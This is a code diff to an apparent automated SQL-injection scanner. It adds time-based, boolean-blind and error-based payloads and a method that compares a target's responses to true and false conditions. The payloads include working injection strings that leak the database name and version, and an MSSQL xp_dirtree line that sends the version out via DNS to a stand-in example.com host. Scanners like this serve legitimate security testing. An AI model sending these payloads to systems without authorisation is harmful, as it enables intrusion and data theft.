@@ -21,6 +21,14 @@ TIME_BASED_PAYLOADS = {
         "baseline": "1 AND SLEEP(0)",
         "inject": "1 AND SLEEP(3)",
     },
+    "mysql_if_sleep": {
+        "baseline": "1 AND IF(1=1,0,0)",
+        "inject": "1 AND IF(1=1,SLEEP(3),0)",
+    },
+    "mysql_or_sleep": {
+        "baseline": "1 OR SLEEP(0)",
+        "inject": "1 OR SLEEP(3)",
+    },
     "postgres_sleep": {
         "baseline": "1; SELECT pg_sleep(0)--",
         "inject": "1; SELECT pg_sleep(3)--",
@@ -31,6 +39,30 @@ TIME_BASED_PAYLOADS = {
     },
 }
 
+# 布尔型盲注载荷（对比 true/false 条件的响应差异）
+BOOLEAN_BASED_PAYLOADS = [
+    {
+        "name": "numeric_or_true",
+        "true_condition": "1 OR 1=1",
+        "false_condition": "1 OR 1=2",
+    },
+    {
+        "name": "numeric_and_true",
+        "true_condition": "1 AND 1=1",
+        "false_condition": "1 AND 1=2",
+    },
+    {
+        "name": "string_or_true",
+        "true_condition": "1' OR '1'='1",
+        "false_condition": "1' OR '1'='2",
+    },
+    {
+        "name": "string_and_true",
+        "true_condition": "1' AND '1'='1",
+        "false_condition": "1' AND '1'='2",
+    },
+]
+
 # 基于错误的检测载荷
 ERROR_BASED_PAYLOADS = [
     "'",                    # 单引号 - 最经典的 SQL 注入探测
@@ -38,6 +70,9 @@ ERROR_BASED_PAYLOADS = [
     "' OR '1'='1",          # 布尔型注入
     "1 OR 1=1",             # 数字型注入
     "' UNION SELECT NULL--", # 联合查询注入
+    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",  # MySQL 报错注入
+    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT DATABASE()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",  # MySQL 重复键报错
+    "1; DECLARE @q VARCHAR(100); SET @q='\\\\' + (SELECT @@version) + '.example.com\\a'; EXEC master.dbo.xp_dirtree @q--",  # MSSQL DNS 外带
 ]
 
 # 常见 SQL 错误关键词（出现在响应中可能表示 SQL 注入）
@@ -188,6 +223,20 @@ class SQLInjectionTool(BaseTool):
                         "payload_used": time_result["payload"],
                     }
 
+                # 第三步：布尔型盲注检测（对比 true/false 条件的响应差异）
+                bool_result = await self._test_boolean_based(
+                    client, url, param, method, headers
+                )
+                if bool_result["vulnerable"]:
+                    evidence["boolean_based_diff"] = bool_result["diff_summary"]
+                    return {
+                        "success": True,
+                        "vulnerable": True,
+                        "technique": "boolean_based_blind",
+                        "evidence": evidence,
+                        "payload_used": bool_result["payload"],
+                    }
+
                 # 未发现漏洞
                 return {
                     "success": True,
@@ -321,6 +370,86 @@ class SQLInjectionTool(BaseTool):
             "payload": "",
             "baseline_time_ms": 0,
             "inject_time_ms": 0,
+        }
+
+    async def _test_boolean_based(
+        self,
+        client: httpx.AsyncClient,
+        url: str,
+        param: str,
+        method: str,
+        headers: dict,
+    ) -> dict:
+        """
+        基于布尔条件的盲注 SQL 注入检测
+
+        通过对比 true 条件和 false 条件的响应差异判断注入点。
+        如果响应长度或内容有明显差异，则可能存在注入。
+
+        Args:
+            client: HTTP 客户端
+            url: 目标 URL
+            param: 测试参数
+            method: HTTP 方法
+            headers: 请求头
+
+        Returns:
+            {vulnerable: bool, payload: str, diff_summary: str}
+        """
+        import re
+
+        for payload_set in BOOLEAN_BASED_PAYLOADS:
+            try:
+                name = payload_set["name"]
+                true_cond = payload_set["true_condition"]
+                false_cond = payload_set["false_condition"]
+
+                # 发送 true 条件请求
+                true_response = await self._send_request(
+                    client, url, param, true_cond, method, headers
+                )
+                true_body = true_response.text
+                true_len = len(true_body)
+                true_status = true_response.status_code
+
+                # 发送 false 条件请求
+                false_response = await self._send_request(
+                    client, url, param, false_cond, method, headers
+                )
+                false_body = false_response.text
+                false_len = len(false_body)
+                false_status = false_response.status_code
+
+                # 检测差异
+                len_diff = abs(true_len - false_len)
+                status_diff = true_status != false_status
+
+                # 内容指纹对比（去数字）
+                true_fp = re.sub(r'\d+', '', true_body)
+                false_fp = re.sub(r'\d+', '', false_body)
+                content_diff = true_fp != false_fp
+
+                # 如果长度差异 > 50 字符 或 状态码不同 或 内容指纹不同，则认为有差异
+                if len_diff > 50 or status_diff or content_diff:
+                    diff_summary = f"len_diff={len_diff}, status_diff={status_diff}, content_diff={content_diff}"
+                    logger.info(
+                        "发现布尔型盲注 SQL 注入: url=%s, param=%s, name=%s, %s",
+                        url, param, name, diff_summary,
+                    )
+                    return {
+                        "vulnerable": True,
+                        "payload": f"{true_cond} vs {false_cond}",
+                        "diff_summary": diff_summary,
+                    }
+
+            except Exception as e:
+                logger.debug("布尔盲注载荷发送失败 (%s): %s", payload_set.get("name", ""), str(e))
+                continue
+
+        return {
+            "vulnerable": False,
+            "payload": "",
+            "diff_summary": "",
         }
 
     @staticmethod
